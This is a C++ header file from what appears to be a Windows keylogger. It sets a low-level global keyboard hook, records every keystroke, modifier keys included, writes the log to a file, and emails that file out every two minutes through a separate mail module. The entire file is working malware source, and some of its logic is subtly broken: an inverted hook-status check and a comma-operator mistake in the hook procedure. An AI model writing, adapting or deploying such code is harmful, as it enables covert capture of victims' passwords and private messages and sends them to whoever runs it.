#ifndef KBHOOK_H_INCLUDED
#define KBHOOK_H_INCLUDED

#include <iostream>
#include <fstream>
#include "windows.h"
#include "SendEmail.h"
#include "KConst.h"
#include "Timer.h"

std::string keyLog = "";

void TimerSendMail()
{
    if(keyLog.empty())
        return;

    std::string lastFile = IO::WriteLog(keyLog);

    if(lastFile.empty())
    {
        Helper::WriteAppLog("File creation not successful. \n KeyLog '" + keyLog + "'");
    }

    int mail = Mail::SendMail("Log [" + lastFile + "]" ,
                            "The file has been attached\n" + keyLog + keyLog,
                            IO::GetOurPath(true) + lastFile);

    if(mail != 7)
        Helper::WriteAppLog("Mail Not Sent! Error Code:" + Helper::ToString(mail));
    else
        keyLog = "";
} //End function TimeSendMail

//Mail Timer
Timer MailTimer(TimerSendMail, 2000 * 60 , Timer::Infinite);

//HHook - Hook pointer
HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode , 0){
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*) lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keyLog += Keys::KEYS[kbd->vkCode].Name;
        if(kbd->vkCode == VK_RETURN)
            keyLog += '\n';
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbd->vkCode;

        if(key == VK_CONTROL ||
           key == VK_LCONTROL ||
           key == VK_RCONTROL ||
           key == VK_SHIFT ||
           key == VK_RSHIFT ||
           key == VK_LSHIFT ||
           key == VK_MENU ||
           key == VK_LMENU ||
           key == VK_RMENU ||
           key == VK_CAPITAL ||
           key == VK_NUMLOCK ||
           key == VK_LWIN ||
           key == VK_RWIN )
        {
            std::string KeyName = Keys::KEYS[kbd->vkCode].Name;
            KeyName.insert(1, "/");
            keyLog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook started ... Timer started!");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);

    return eHook == NULL;
};

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}
#endif // KBHOOK_H_INCLUDED
